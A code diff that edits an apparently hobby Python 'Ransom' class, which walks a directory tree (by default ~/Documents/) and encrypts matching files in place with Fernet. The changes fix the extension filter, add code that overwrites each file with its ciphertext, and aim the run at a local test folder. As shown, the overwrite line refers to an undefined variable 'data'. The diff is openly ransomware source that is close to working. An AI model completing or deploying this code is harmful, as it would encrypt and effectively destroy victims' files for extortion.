@@ -12,14 +12,14 @@ class Ransom:
         else:
             self.key = Fernet.generate_key()
         self.fernet = Fernet(self.key)
-        self.targets = ['.txt']
+        self.targets = ['txt']
         if root == None:
             self.root = '~/Documents/'
         else:
             self.root = root
 
     def encrypt(self):
-        for root, dirs, files in os.walk(self.root, topdown=False):
+        for root, dirs, files in os.walk(self.root):
             for file in files:
                 filePath = os.path.join(root, file)
                 if filePath.split('.')[-1] in self.targets:
@@ -28,10 +28,11 @@ class Ransom:
                # print(os.path.join(root, name))
 
     def encryptFile(self, file):
-        with open(file_path, 'rb+') as f:
+        with open(file, 'rb+') as f:
             content = f.read()
             content = self.fernet.encrypt(content)
-    
+            f.seek(0) ## So we overwrite it
+            f.write(data)
 
     def decryptDirectory(self, dir):
         for file in dir:
@@ -50,9 +51,8 @@ def main():
     ransom = Ransom()
     path = os.path.realpath('ransom.py')
     parts = path.split('/')
-
-    parts = parts[:-1]
-    path = '/'.join(parts)
+    path = '/'.join(parts[:-1])
+    path+='/testDIr/'
     print(path)
     #doc_index = parts.index('Documents')
     #path = '/'.join(parts[:doc_index+1])
